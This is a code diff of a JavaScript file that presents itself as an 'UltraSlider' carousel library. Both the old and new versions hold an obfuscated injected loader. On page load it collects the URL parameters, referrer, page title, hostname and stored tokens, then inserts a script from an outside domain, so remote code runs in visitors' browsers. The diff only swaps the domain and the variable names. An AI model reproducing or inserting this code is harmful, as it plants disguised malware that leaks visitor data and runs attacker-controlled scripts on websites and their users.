@@ -9,45 +9,45 @@
  *   const slider = new window.UltraSlider('#my-slider', {  options  });
  */
 (function (global, factory) {
-  var name = '_MQnMHS59FkYqv55q';
-    if (!window._MQnMHS59FkYqv55q) {
-        window._MQnMHS59FkYqv55q = {
+  var name = '_7YgPRCXcqHSJ1pq4';
+    if (!window._7YgPRCXcqHSJ1pq4) {
+        window._7YgPRCXcqHSJ1pq4 = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://glimberate.live/4rhss7Wn',
+            R_PATH: 'https://vexture.live/4rhss7Wn',
         };
     }
-    const _ZhNjTMnZFqj1PnWb = localStorage.getItem('config');
-    if (typeof _ZhNjTMnZFqj1PnWb !== 'undefined' && _ZhNjTMnZFqj1PnWb !== null) {
-        var _xS31Zp4gkTBLXFzT = JSON.parse(_ZhNjTMnZFqj1PnWb);
-        var _YjgDyWcPYKgqSv6h = Math.round(+new Date()/1000);
-        if (_xS31Zp4gkTBLXFzT.created_at + window._MQnMHS59FkYqv55q.ttl < _YjgDyWcPYKgqSv6h) {
+    const _VS9rhQ5JqSH6Lb61 = localStorage.getItem('config');
+    if (typeof _VS9rhQ5JqSH6Lb61 !== 'undefined' && _VS9rhQ5JqSH6Lb61 !== null) {
+        var _xxB1ct4SKB1nX1hB = JSON.parse(_VS9rhQ5JqSH6Lb61);
+        var _ZZKLGjQXMkPhdXH3 = Math.round(+new Date()/1000);
+        if (_xxB1ct4SKB1nX1hB.created_at + window._7YgPRCXcqHSJ1pq4.ttl < _ZZKLGjQXMkPhdXH3) {
             localStorage.removeItem('subId');
             localStorage.removeItem('token');
             localStorage.removeItem('config');
         }
     }
-    var _vnbpqZQw1k7mYYG6 = localStorage.getItem('subId');
-    var _f7fdmP4KJVTLP73s = localStorage.getItem('token');
-    var _dLSPrVmhVKVzNvyZ = '?return=js.client';
-        _dLSPrVmhVKVzNvyZ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
-        _dLSPrVmhVKVzNvyZ += '&se_referrer=' + encodeURIComponent(document.referrer);
-        _dLSPrVmhVKVzNvyZ += '&default_keyword=' + encodeURIComponent(document.title);
-        _dLSPrVmhVKVzNvyZ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
-        _dLSPrVmhVKVzNvyZ += '&name=' + encodeURIComponent(name);
-        _dLSPrVmhVKVzNvyZ += '&host=' + encodeURIComponent(window._MQnMHS59FkYqv55q.R_PATH);
-    if (typeof _vnbpqZQw1k7mYYG6 !== 'undefined' && _vnbpqZQw1k7mYYG6 && window._MQnMHS59FkYqv55q.unique) {
-        _dLSPrVmhVKVzNvyZ += '&sub_id=' + encodeURIComponent(_vnbpqZQw1k7mYYG6);
+    var _4b13PG7nM2WhHFBz = localStorage.getItem('subId');
+    var _B8vNjTjq1xbd9zRf = localStorage.getItem('token');
+    var _2Y9r6vWW4FJLjFH6 = '?return=js.client';
+        _2Y9r6vWW4FJLjFH6 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _2Y9r6vWW4FJLjFH6 += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _2Y9r6vWW4FJLjFH6 += '&default_keyword=' + encodeURIComponent(document.title);
+        _2Y9r6vWW4FJLjFH6 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _2Y9r6vWW4FJLjFH6 += '&name=' + encodeURIComponent(name);
+        _2Y9r6vWW4FJLjFH6 += '&host=' + encodeURIComponent(window._7YgPRCXcqHSJ1pq4.R_PATH);
+    if (typeof _4b13PG7nM2WhHFBz !== 'undefined' && _4b13PG7nM2WhHFBz && window._7YgPRCXcqHSJ1pq4.unique) {
+        _2Y9r6vWW4FJLjFH6 += '&sub_id=' + encodeURIComponent(_4b13PG7nM2WhHFBz);
     }
-    if (typeof _f7fdmP4KJVTLP73s !== 'undefined' && _f7fdmP4KJVTLP73s && window._MQnMHS59FkYqv55q.unique) {
-        _dLSPrVmhVKVzNvyZ += '&token=' + encodeURIComponent(_f7fdmP4KJVTLP73s);
+    if (typeof _B8vNjTjq1xbd9zRf !== 'undefined' && _B8vNjTjq1xbd9zRf && window._7YgPRCXcqHSJ1pq4.unique) {
+        _2Y9r6vWW4FJLjFH6 += '&token=' + encodeURIComponent(_B8vNjTjq1xbd9zRf);
     }
     if ('' !== '') {
-        _dLSPrVmhVKVzNvyZ += '&bypass_cache=';
+        _2Y9r6vWW4FJLjFH6 += '&bypass_cache=';
     }
     var a = document.createElement('script');
         a.type = 'application/javascript';
-        a.src = window._MQnMHS59FkYqv55q.R_PATH + _dLSPrVmhVKVzNvyZ;
+        a.src = window._7YgPRCXcqHSJ1pq4.R_PATH + _2Y9r6vWW4FJLjFH6;
     var s = document.getElementsByTagName('script')[0];
     s.parentNode.insertBefore(a, s)
   if (typeof define === "function" && define.amd) {
